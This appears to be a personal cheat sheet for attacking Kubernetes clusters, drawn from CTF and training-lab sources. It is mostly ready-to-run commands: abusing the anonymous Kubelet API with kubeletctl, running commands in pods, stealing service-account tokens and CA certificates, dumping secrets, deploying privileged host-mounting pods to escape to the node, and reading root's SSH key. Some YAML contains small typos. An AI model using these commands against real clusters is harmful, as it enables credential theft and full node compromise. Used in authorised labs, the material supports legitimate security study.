# Kubernetes Hacking

For Administrating and general [[Kubernetes]] information follow the link. 

## Considerations

Kubernetes Control Plane Network Services Ports

| **Control Plane Network Service** | **TCP Ports**  |
| --------------------------------- | -------------- |
| `etcd`                            | `2379`, `2380` |
| `API server`                      | `6443`         |
| `Scheduler`                       | `10251`        |
| `Controller Manager`              | `10252`        |
| `Kubelet API`                     | `10250`        |
| `Read-Only Kubelet API`           | `10255`        |

There is a lot of JSON so use [[JQ]]

Kubernetes Security Domains:
- Cluster infrastructure security
- Cluster configuration security
- Application security
- Data security


*"By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous."*

## Cheatsheet

No `microk8s` no problem get official `kubectl` binary here: [Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/); official `curl` command-age..
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

# ARM4
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl"

```

Enumerate permissions
```bash
# Enumerate versions, permissions through `| grep message`
curl https://$k8APIserver:6443 -k

microk8s kubectl auth can-i --list
# If you see:
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
# You can do anything
```

Enumerate pods and namespaces, image name
```bash
curl https://$k8APIserver:10250/pods -k | jq .

env # services are often stored as environment variables

microk8s kubectl get namespace
microk8s kubectl get pods
microk8s kubectl get pod $pod -o yaml # get the image: $field of current pod
microk8s kubectl get nodes
microk8s kubectl get deployments
microk8s kubectl get services
microk8s kubectl get ingress
microk8s kubectl get jobs
```

Extract Pods
```bash
kubeletctl -i --server $k8APIserver pods
```

Available commands through builtin `kubeletctl` RCE reporting
```bash
kubeletctl -i --server $k8APIserver scan rce
```

Execute commands
```bash
kubeletctl -i --server $k8APIserver exec "id" -p $podname -c $contianername
```

Find Secrets - secret values in resources called Secrets that get mounted into pods as either environment variables or files
```bash
kubectl get secrets
kubectl describe secret $secretName
kubectl get secret $secretName -o 'json'
```

#### Token Abuse

Extraction Tokens
```bash
kubeletctl -i --server $k8APIserver exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p $podname -c $contianername | tee -a k8.token
```

More Token abuse
```bash
# /var/run/secrets/kubernetes.io/serviceaccount/token
./kubectl auth can-i --list --token=${TOKEN}
./kubectl get pods --token=${TOKEN}
./kubectl get serviceaccount --token=${TOKEN}
# execute bash on a pod
/kubectl exec -it $pod --token=${TOKEN} -- /bin/bash
```

List Privileges of a token
```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://$k8APIserver:6443 auth can-i --l
```


Secret Token locations and with RCE on pod; from [GitHub ChrisPritchard/ctf-writeups/ TIPS-AND-TRICKS.md#kubernetes](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md); citing [Hacktricks Kubernetes Pentesting]([https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting))
```bash
/run/secrets/kubernetes.io/serviceaccount
/var/run/secrets/kubernetes.io/serviceaccount
/secrets/kubernetes.io/serviceaccount

# note the port 6443 has also been found as 16433
# for commands, finding out what your privs are would be `auth can-i --list`. Others, like `get secrets -n [namespace]` etc.
kubectl --token=$(cat token) --server=https://10.10.175.123:6443 --insecure-skip-tls-verify=true [commands]
```

#### Certificate Abuse

```shell-session
kubeletctl --server $k8APIserver exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p $podname -c $contianername | tee -a ca.crt
```
#### Make a pod and mount away!

May require token
```bash
# /var/run/secrets/kubernetes.io/serviceaccount/token
./kubectl auth can-i --list --token=${TOKEN}
# Get the image for privesc.yml
kubectl get pods --all-namespaces -o jsonpath="{.items[*].spec.containers[*].image}" --token=${TOKEN} | tr -s '[[:space:]]' '\n' | sort | uniq -c
```
[List all container images in all namespaces](https://kubernetes.io/docs/tasks/access-application-cluster/list-all-running-container-images/)

For Certificate abuse
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://$k8APIserver:6443 apply -f privesc.yaml
```


Create a YAML file to create a pod to run as root - named kubeRevShell.yaml - [prettifer](https://onlineyamltools.com/prettify-yaml) 
```YAML
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: kube-system
spec:sed 
  containers:
    - name: shell
      image: # GET THE IMAGE NAME OF CURRENT POD
      # imagePullPolicy: IfNotPresent 
      command: ['/bin/sh']
      args: ['-c', 'sleep 300000']
      volumeMounts:
        - mountPath: /mnt
          name: hostfs
  volumes:
    - name: hostfs
      hostPath:
        path: /
  autommountServiceAccountToken: true
  hostNetwork: true
```

[HTB Academy](https://academy.hackthebox.com) varient
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

[BishopFox BadPod.yml](https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml)
```yml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

To force image pulling or not if the cluster lack internet connection set and set `image:`  to locally cached image.
```yaml
imagePullPolicy: IfNotPresent 
imagePullPolicy: Never 
imagePullPolicy: IfNotPresent 
```


Beware:
`name:` must be a lowercase RFC 1123 label.

Apply this configuration
```bash
microk8s kubectl apply -f kubeRevShell.yaml
```

Check the status of the pod
```bash
microk8s kubectl get pods -n kube-system # display kube-system namespace
```
https://tryhackme.com/room/insekube
Exec a very minimal shell, works as nested `nc` no tty... 
```bash
./kubectl exec some-pod -n kube-system --stdin --tty -- /bin/bash
# Or
./kubectl exec -it some-pod --token=${TOKEN} -- /bin/bash
```

Get root's id_rsa
```bash
kubeletctl --server $k8APIServer exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

Clean up yourself 
```bash
./kubectl delete -f kubeShell.yaml
```



#### Kubernetes Token Abuse

`cat /var/run/secrets/kubernetes.io/$account/token`

Pod breakout

Privilege Escape

Cloud Hacking

## References

[Online YAML prettifier](https://onlineyamltools.com/prettify-yaml)
[Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/);
[THM Insekube Room](https://tryhackme.com/room/insekube)
[Unofficial Kubernetes Documentation](https://unofficial-kubernetes.readthedocs.io/en/latest/)
[Hacktricks Kubernetes Pentesting]([https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting))
[GitHub ChrisPritchard/ctf-writeups/ TIPS-AND-TRICKS.md#kubernetes](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md)
[HTB Academy](https://academy.hackthebox.com)